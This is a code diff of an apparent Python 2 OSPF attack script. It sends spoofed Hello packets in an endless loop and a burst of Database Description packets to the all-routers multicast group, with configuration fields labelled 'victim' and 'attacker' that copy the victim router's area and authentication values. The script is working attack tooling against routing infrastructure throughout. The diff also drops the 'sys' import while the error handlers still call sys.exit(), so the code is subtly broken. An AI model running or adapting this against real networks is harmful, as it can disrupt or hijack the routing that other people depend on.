@@ -1,25 +1,62 @@
-import socket, sys
+import socket, random
 import struct
+import threading
 
+import time
 import yaml
 from struct import *
 
-from network.NetworkUtils import serializeIPHeader, checksum
-from network.OSPFSerializer import serializeOSPFHelloHeader, serializeOSPFDatabaseHeader
+from network.OSPFSerializer import serialize_ospf_hello_header, serializeOSPFDatabaseHeader
 from packet.OSPFDatabaseDescriptorHeader import OSPFDatabaseDescriptorHeader
 from packet.OSPFHelloHeader import OSPFHelloHeader
 
-def create_dd_update(router_id, area_id):
-    dd_update = OSPFDatabaseDescriptorHeader(2, 32, router_id, area_id, 0, 0, 0, 0, 1)
+def send_dd_updates(config, sfd):
+    seq_number = random.randint(100, 2000)
+    dd_update = OSPFDatabaseDescriptorHeader(config['ospf']['version'], 32, config['victim']['id'] + 1,
+                                             config['victim']['area_id'], config['victim']['auth_type'],
+                                             config['victim']['auth1'], config['victim']['auth2'],
+                                             config['attacker']['interface_mtu'], seq_number)
+    dd_update.set_option_mc(True)
+    dd_update.set_control_master_slave_bit(True)
+    dd_update.set_control_initial_bit(True)
+    dd_update.set_control_more_bit(True)
 
-    return dd_update
+    try:
+        time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet
+        # Send initial DB update
+        sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
+                   (config['ospf']['multicast_all_routers'], config['ospf']['port']))
+        dd_update.set_control_initial_bit(False) # no longer the initial packet
+        time.sleep(config['attacker']['wait_between_dd']) # wait before next packet
+        for i in range(0, config['attacker']['dd_count'], 1):
+            sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
+                       (config['ospf']['multicast_all_routers'], config['ospf']['port']))
+            time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet
 
-def createHelloPacket(router_id, area_id, network_mask, hello_interval, router_dead_interval):
-    hello_packet = OSPFHelloHeader(2, 48, router_id, area_id, 0, 0, 0,
-                                                    network_mask, hello_interval, 255, router_dead_interval,
-                                                    "0.0.0.0", "0.0.0.0", "0.0.0.0")
+        dd_update.set_control_more_bit(False) # no more packets
+        sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
+                   (config['ospf']['multicast_all_routers'], config['ospf']['port']))
+    except socket.error, msg:
+        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        sys.exit()
+
+def send_hello_packet(config, sfd):
+    hello_packet = OSPFHelloHeader(config['ospf']['version'], 48, config['victim']['id'] + 1,
+                                   config['victim']['area_id'], config['victim']['auth_type'],
+                                   config['victim']['auth1'], config['victim']['auth2'], config['network']['mask'],
+                                   config['victim']['hello_interval'], config['attacker']['priority'],
+                                   config['victim']['dead_interval'], "0.0.0.0", "0.0.0.0", "0.0.0.0")
     hello_packet.set_option_mc(True)
-    return hello_packet
+
+    try:
+        while True:
+            print "Sending hello packet..."
+            sfd.sendto(serialize_ospf_hello_header(hello_packet),
+                       (config['ospf']['multicast_all_routers'], config['ospf']['port']))
+            time.sleep(config['victim']['hello_interval'])
+    except socket.error, msg:
+        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        sys.exit()
 
 
 def main():
@@ -27,22 +64,18 @@ def main():
     with open("config.yml", 'r') as ymlfile:
         config = yaml.load(ymlfile)
 
-    MCAST_GRP = '224.0.0.1'
-    MCAST_PORT = 10000
-
     # initialize the socket
     try:
-        sfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, 89)
-        ttl = struct.pack('b', 1)
-        sfd.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
+        # create the socket
+        sfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, config['ospf']['port'])
+        sfd.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, struct.pack('b', 1))
 
-        hello = createHelloPacket('192.168.1.9', "0.0.0.0", '255.255.255.0', 10, 40)
-        dd_update = create_dd_update('192.168.1.9', "0.0.0.0")
+        # Start sending Hello packets according to configuration
+        thread = threading.Thread(target=send_hello_packet, args=(config, sfd))
+        thread.start()
 
-        for i in range(1, 1000, 1):
-            print sfd.sendto(serializeOSPFHelloHeader(hello), (MCAST_GRP, MCAST_PORT))
-            print sfd.sendto(serializeOSPFDatabaseHeader(dd_update), (MCAST_GRP, MCAST_PORT))
-            dd_update.increment_sequence()
+        # Send the DB updates
+        send_dd_updates(config, sfd)
 
     except socket.error, msg:
         print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
